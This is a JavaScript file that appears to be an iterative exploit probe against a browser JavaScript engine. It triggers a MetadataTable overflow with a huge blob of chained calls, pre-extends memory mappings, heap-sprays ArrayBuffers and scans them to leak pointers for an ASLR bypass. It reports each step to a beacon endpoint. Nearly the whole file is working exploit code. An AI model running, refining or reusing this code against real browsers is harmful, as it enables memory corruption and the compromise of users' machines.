// p506 — MetadataTable overflow: PRE-EXTENDED VIRTUAL MAPPING + CHAINED CALLS
//
// V505 may fail if the 4.3GB sweep hits unmapped memory (SIGSEGV during
// finishCreation). This probe pre-extends the virtual address space by
// cycling large AB allocations before compile. MADV_FREE preserves
// virtual mappings after free, so the sweep writes to mapped pages.
//
// AB cycling: allocate 500MB → free → repeat 6x = ~3GB of virtual mapping.
// Combined with existing heap pages, this should cover most of the 4.3GB sweep.
//
// Architecture:
//   Phase 0: AB cycling (6 rounds × 500 × 1MB) to extend virtual mapping
//   Phase 1: Build blob with chained calls → lazy parse → function defined
//   Phase 2: Bait-and-switch spray (100 × 100,112B)
//   Phase 3: GC, then call function → parse → bytecodeGen → finishCreation → sweep
//   Phase 4: Scan ABs from main thread
//
// Beacon prefix: V506-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V506-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 0: Pre-extend virtual mapping via AB cycling ═══
  // Allocate large ABs, then free → MADV_FREE preserves virtual pages
  var CYCLE_ROUNDS = 6;
  var CYCLE_COUNT = 500;  // ABs per round
  var CYCLE_SIZE = 1048576; // 1MB each
  var totalMapped = 0;

  for (var round = 0; round < CYCLE_ROUNDS; round++) {
    var cycle = [];
    var allocOK = 0;
    for (var i = 0; i < CYCLE_COUNT; i++) {
      try {
        cycle.push(new ArrayBuffer(CYCLE_SIZE));
        allocOK++;
      } catch(e) { break; }
    }
    // Free via structuredClone transfer
    var freed = 0;
    for (var i = 0; i < cycle.length; i++) {
      try {
        structuredClone(cycle[i], {transfer: [cycle[i]]});
        freed++;
      } catch(e) {}
      cycle[i] = null;
    }
    cycle = null;
    totalMapped += freed * CYCLE_SIZE;
    B('CYCLE-' + round, 'alloc=' + allocOK + ',freed=' + freed + ',totalMB=' + Math.round(totalMapped / 1048576));
  }

  // Heavy GC to process all freed ABs
  for (var g = 0; g < 30; g++) {
    var junk = [];
    for (var j = 0; j < 5000; j++) junk.push({x: j});
    junk = null;
  }
  B('PREEXTEND-DONE', 'totalMB=' + Math.round(totalMapped / 1048576));

  // ═══ PHASE 1: Build function blob with CHAINED CALLS ═══
  var N = 38348816;
  var CHAIN = 50;
  var FULL_CHAINS = Math.floor(N / CHAIN);
  var REM = N - FULL_CHAINS * CHAIN;

  B('BUILD', 'N=' + N + ',chain=' + CHAIN);

  var oneChain = 'a' + '()'.repeat(CHAIN) + ';';
  var PART_SZ = 50000;
  var nParts = Math.floor(FULL_CHAINS / PART_SZ);
  var remPart = FULL_CHAINS - nParts * PART_SZ;
  var partStr = oneChain.repeat(PART_SZ);

  var parts = [];
  parts.push('window.__v506fn=function(a){if(typeof a==="string"){');
  for (var p = 0; p < nParts; p++) parts.push(partStr);
  if (remPart > 0) parts.push(oneChain.repeat(remPart));
  if (REM > 0) parts.push('a' + '()'.repeat(REM) + ';');
  parts.push('}window.__v506ok=1;};');
  partStr = null;
  oneChain = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var blobUrl = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onerror = function() { B('SCRIPT-ERR', 'load-failed'); };

  sc.onload = function() {
    var hasFn = !!window.__v506fn;
    B('COMPILED', hasFn ? 'OK' : 'FAIL');
    if (!hasFn) { B('DONE', 'no-fn'); return; }

    URL.revokeObjectURL(blobUrl);
    blob = null;

    // ═══ PHASE 2: Bait-and-switch spray ═══
    var BUF_SZ = 100112;
    var SPRAY_N = 100;
    var bufs = new Array(SPRAY_N);
    for (var i = 0; i < SPRAY_N; i++) {
      bufs[i] = new ArrayBuffer(BUF_SZ);
    }
    B('SPRAY', 'n=' + SPRAY_N);

    var xferred = 0;
    for (var i = 0; i < SPRAY_N / 2; i++) {
      try {
        structuredClone(bufs[i], {transfer: [bufs[i]]});
        xferred++;
      } catch(e) { if (xferred === 0) break; }
      bufs[i] = null;
    }
    B('XFER', 'n=' + xferred);

    var views = [];
    for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
      if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
        views.push(new Uint8Array(bufs[i]));
      }
    }
    B('VIEWS', 'n=' + views.length);

    // ═══ PHASE 3: GC + Call ═══
    for (var g = 0; g < 20; g++) {
      var junk = [];
      for (var j = 0; j < 2000; j++) junk.push(new ArrayBuffer(4096));
      junk = null;
    }
    B('GC-DONE', '');

    setTimeout(function() {
      B('CALLING', '');
      var callOk = false;
      try {
        window.__v506fn(0);
        callOk = true;
      } catch(e) {
        B('CALL-ERR', (e.message || 'unknown').substring(0, 80));
      }
      B('CALL-DONE', callOk ? 'OK' : 'THREW');
      window.__v506fn = null;

      setTimeout(function() { doScan(views); }, 50);
    }, 100);
  };

  document.head.appendChild(sc);
  sc.src = blobUrl;

  // ═══ SCAN ═══
  function doScan(views) {
    B('SCAN-START', 'views=' + views.length);
    var hitBufs = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;
      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 8) {
        if (view[q] | view[q+1] | view[q+2] | view[q+3]) hasNZ = true;
      }
      if (!hasNZ) continue;
      hitBufs++;

      var nz = 0;
      for (var j = 0; j < view.length; j++) { if (view[j] !== 0) nz++; }
      B('HIT-' + vi, 'nz=' + nz);
      if (hitBufs > 5) continue;

      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      var ptrs = 0;
      for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 8; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var pOff = eOff + 24;
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (view[pOff + b]) { anyNZ = true; break; } }
        if (!anyNZ) continue;
        B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + hex8(view, pOff));
        if (leakedPtrs.length < 8) leakedPtrs.push(hex8(view, pOff));
        ptrs++;
      }

      var idxs = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
        var val = u32(view, eOff + 68);
        if (val !== 0 && val !== 0xFFFFFFFF && val < 40000000) {
          B('IDX-' + idxs, 'off=' + (eOff+68) + ',val=' + val);
          idxs++;
        }
      }

      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 336; off += 8) {
          if (view[off]|view[off+1]|view[off+2]|view[off+3]|
              view[off+4]|view[off+5]|view[off+6]|view[off+7]) {
            chunks.push(off + ':' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0,15).join(' '));
      }
    }

    B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
    if (leakedPtrs.length > 0) {
      var p0 = leakedPtrs[0];
      var prefix = p0.substring(0, 8);
      var consistent = 0;
      for (var i = 0; i < leakedPtrs.length; i++) {
        if (leakedPtrs[i].substring(0, 8) === prefix) consistent++;
      }
      B('ASLR-LEAK', 'ptr0=0x' + leakedPtrs[0] + ',total=' + leakedPtrs.length + ',consistent=' + consistent);
    } else if (hitBufs > 0) {
      B('SWEEP-HIT', 'no-ptrs');
    } else {
      B('NO-HIT', 'all-zero');
    }
    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
  }
})();
